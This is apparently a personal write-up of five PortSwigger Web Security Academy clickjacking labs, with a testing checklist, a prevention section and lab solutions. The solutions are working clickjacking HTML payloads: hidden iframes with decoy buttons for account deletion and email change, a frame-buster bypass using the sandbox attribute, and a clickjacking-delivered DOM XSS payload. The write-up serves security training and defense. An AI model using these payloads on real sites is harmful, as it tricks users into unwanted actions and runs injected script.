# Clickjacking

> PortSwigger Web Security Academy · **4/5** labs completed

Clickjacking tricks a user into clicking something different from what they see, by loading the target site in a transparent frame on top of a decoy page.

[← Back to the index](README.md)

## Contents

- [How to approach this vulnerability](#how-to-approach-this-vulnerability)
- [1. Basic clickjacking with CSRF token protection](#1-basic-clickjacking-with-csrf-token-protection)
- [2. Clickjacking with form input data prefilled from a URL parameter](#2-clickjacking-with-form-input-data-prefilled-from-a-url-parameter)
- [3. Clickjacking with a frame buster script](#3-clickjacking-with-a-frame-buster-script)
- [4. Exploiting clickjacking vulnerability to trigger DOM-based XSS](#4-exploiting-clickjacking-vulnerability-to-trigger-dom-based-xss)
- [5. Multistep clickjacking](#5-multistep-clickjacking)
- [Prevention](#prevention)

## How to approach this vulnerability

Checklist of things to check when you suspect this class of bug, covering the different ways it shows up:

- Check the response headers for `X-Frame-Options` and `Content-Security-Policy: frame-ancestors` — if both are absent, the page can usually be framed.
- If headers exist, test whether they can be bypassed (e.g. only `SAMEORIGIN` but a same-site open redirect exists, or the header is missing on a specific page/parameter combination).
- Identify a sensitive one-click action to target: delete account, change setting, like/follow, confirm a transaction.
- Check whether form fields relevant to the action can be prefilled via URL parameters, which removes the need to trick the user into typing anything.
- Build a decoy page with the target framed and made transparent (`opacity:0`), positioned so the real click lands on the hidden target button.
- Check for any client-side frame-busting script and whether the `sandbox` attribute on your iframe can disable it.
- For multi-step actions, check if a multistep clickjacking chain is needed (dragging, multiple clicks) to reach the sensitive confirmation step.

## Lab write-ups

### 1. Basic clickjacking with CSRF token protection

**Lab:** [Basic clickjacking with CSRF token protection](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected)

- In this lab we have to delete the account using clickjacking
- To do that first we have to build an iframe with the relative CSS to hide the iframe from the victim
- To do that write the below css to do it

```html
<style>
iframe
{
position: relative;
height: 600px;
width: 600px;
opacity: 0.000001;
z-index:2;
}
div
{
position: absolute;
top: 550px;
left: 50px;
z-index: 1;
}
</style>
<div>click here</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

- Now adjust the top and left values accordingly to move the decoy button on top of delete button
- For testing the position of the decoy button have opacity to 0.1 to know the position but while submitting it make it to the above value
- Now deliver to victim to finish the lab

---

### 2. Clickjacking with form input data prefilled from a URL parameter

**Lab:** [Clickjacking with form input data prefilled from a URL parameter](https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input)

- In this lab we have to change the email
- To do this is the payload

```html
<style>
iframe
{
position: relative;
height: 800px;
width: 600px;
opacity: 0.0001;
z-index: 2;
}
div
{
position: absolute;
top: 590px;
left: 100px;
z-index: 1;
}
</style>
<div>click here</div>
<iframe src ="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=user@example.com"></iframe>
```

- Do the same thing as the first lab and submit it

---

### 3. Clickjacking with a frame buster script

**Lab:** [Clickjacking with a frame buster script](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script)

- In this lab they have used frame buster and it prevents clickjacking
- To bypass that use `sandbx="allow-forms"` to break it after src in iframe

```html
<style>
iframe
{
position: relative;
height: 800px;
width: 600px;
opacity: 0.0001;
z-index: 2;
}
div
{
position: absolute;
top: 490px;
left: 100px;
z-index: 1;
}
</style>
<div>click here</div>
<iframe src ="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=user@example.com" sandbox="allow-forms"></iframe>
```

- Other than that everything is same like 2nd lab

---

### 4. Exploiting clickjacking vulnerability to trigger DOM-based XSS

**Lab:** [Exploiting clickjacking vulnerability to trigger DOM-based XSS](https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss)

- In this lab there is a DOM based XSS so we need to exploit it using clickjacking
- There is a submit feedback endpoint where we can submit the feedback
- So what we are going to do now is, there are 4 inputs- name, email, subject and message. we are going to inject the xss payload in name column and submit all the info regularly
- We are going to use `<img src=1 onerror=print()>` for xss and this is going to go inside name
- So the full payload is

```html
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 615px;
        left: 80px;
        z-index: 1;
    }
</style>

<div>click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=a@ad.com&subject=test&message=test#feedbackResult"></iframe>
```

---

### 5. Multistep clickjacking

**Lab:** [Multistep clickjacking](https://portswigger.net/web-security/clickjacking/lab-multistep)

- This is same like lab 1 but it has the confirmation for deleting the account so we need to place 2 decoy buttons for to complete this lab
- To do that below is the payload

```html
<style>

iframe
{
position: relative;
width: 500px;
height: 700px;
opacity: 0.0001;
z-index: 2;

}

.first, .second
{
position: absolute;
top: 540px;
left: 70px;
z-index: 1;
}

.second
{
top: 300px;
left: 225px;
}
</style>

<div class="first">click me first</div>
<div class="second">click me next</div>
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

- This is the correct payload but I am unable to submit it and finish the lab

---

## Prevention

How this class of bug is fixed, based on what these labs showed:

- Send `Content-Security-Policy: frame-ancestors` (or `X-Frame-Options: DENY` / `SAMEORIGIN`) on every page that should not be framed.
- Do not rely on JavaScript frame-buster scripts. The `sandbox` attribute on an iframe can disable them.
- Use `SameSite` cookies so a framed page does not carry the victim's session in cross-site contexts.
- Do not let URL parameters prefill forms for sensitive actions. Add a confirmation step for dangerous actions.
